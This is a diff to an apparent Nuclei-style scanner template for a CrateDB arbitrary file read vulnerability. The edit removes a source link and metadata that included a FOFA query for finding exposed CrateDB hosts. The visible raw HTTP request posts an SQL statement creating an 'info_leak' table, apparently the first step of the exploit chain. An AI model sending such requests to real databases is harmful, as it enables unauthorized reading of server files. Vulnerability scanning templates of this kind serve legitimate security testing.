@@ -3,12 +3,8 @@ info:
   name: CrateDB数据库任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kldu85t50tdo317o'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kldu85t50tdo317o
-    fofa: title="CrateDB"
 http:
 - raw:
   - 'POST /_sql?types HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Content-Type: application/json; charset=UTF-8
-
-
 
 
     {"stmt":"CREATE TABLE info_leak(info_leak STRING);"}
